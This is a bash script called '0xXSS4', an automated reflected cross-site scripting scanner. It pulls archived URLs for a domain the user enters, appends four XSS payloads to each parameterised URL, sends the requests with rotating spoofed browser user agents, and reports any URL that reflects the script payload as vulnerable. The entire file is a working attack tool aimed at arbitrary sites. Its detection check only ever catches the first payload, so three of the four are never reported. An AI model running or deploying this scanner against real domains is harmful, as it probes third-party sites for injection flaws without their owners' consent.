#!/bin/bash

CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
RESET='\033[0m'

echo -e "${RED}

 ██████╗ ██╗  ██╗██╗  ██╗██╗  ██╗███████╗███████╗
██╔═████╗╚██╗██╔╝╚██╗██╔╝██║  ██║██╔════╝██╔════╝
██║██╔██║ ╚███╔╝  ╚███╔╝ ███████║███████╗███████╗
████╔╝██║ ██╔██╗  ██╔██╗ ╚════██║╚════██║╚════██║
╚██████╔╝██╔╝ ██╗██╔╝ ██╗     ██║███████║███████║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚══════╝╚══════╝ 
         ${GREEN}   0xXSS4   ${RESET}"

start_time=$(date +%T)
start_date=$(date +"%Y-%m-%d %T")

echo -e "${YELLOW}[INFO]${RESET} ${CYAN}Script started at: $start_date${RESET}\n"

echo -e "\n${YELLOW}==================================================${RESET}"
echo -e "${BLUE}          🌐 Enter the target domain: ${RESET}"
echo -e "${YELLOW}==================================================${RESET}"
read -p "> " domain

if [[ -z "$domain" ]]; then
    echo -e "${RED}[ERROR] No domain provided! Please enter a valid domain.${RESET}"
    exit 1
fi

user_agents=( 
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" 
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15" 
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36" 
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1" 
)

payloads=( 
    '"><script>alert(1)</script>' 
    '"><img src=x onerror=alert(2)>' 
    '"><svg onload=alert(3)>' 
    '"><body onload=alert(4)>' 
)

echo -e "\n${YELLOW}[INFO]${RESET} ${CYAN}Processing domain: ${BLUE}$domain${RESET}\n"

temp_urls=$(mktemp)

{ 
    echo -e "${YELLOW}[INFO]${RESET} ${CYAN}Gathering URLs from various sources...${RESET}\n"
    
    waybackurls "$domain" >> "$temp_urls"
    
    gau "$domain" 2>/dev/null >> "$temp_urls"

    grep '=' "$temp_urls" | while read -r host; do  # Read each host
        for payload in "${payloads[@]}"; do
            random_agent=${user_agents[$RANDOM % ${#user_agents[@]}]}
            
            response=$(curl --silent --path-as-is --insecure -A "$random_agent" "$host$payload")
            if echo "$response" | grep -qs "<script>alert"; then
                echo -e "${YELLOW}=====================${RESET}"
                echo -e "$host$payload ${RED}[Vulnerable]${RESET}"  
                echo -e "${YELLOW}=====================${RESET}"
            fi
        done
    done
    
} || {
    echo -e "${RED}[ERROR] Error processing domain: $domain${RESET}"
}

rm -f "$temp_urls"

end_time=$(date +%T)
end_date=$(date +"%Y-%m-%d %T")

start_seconds=$(date -d "$start_time" +%s)
end_seconds=$(date -d "$end_time" +%s)
elapsed_time=$(($end_seconds - $start_seconds))

echo -e "\n${GREEN}[SUCCESS]${RESET} ${CYAN}Scan completed at: $end_date.${RESET}"
echo -e "${GREEN}[INFO]${RESET} ${CYAN}Total time taken: ${YELLOW}${elapsed_time} seconds${RESET}."
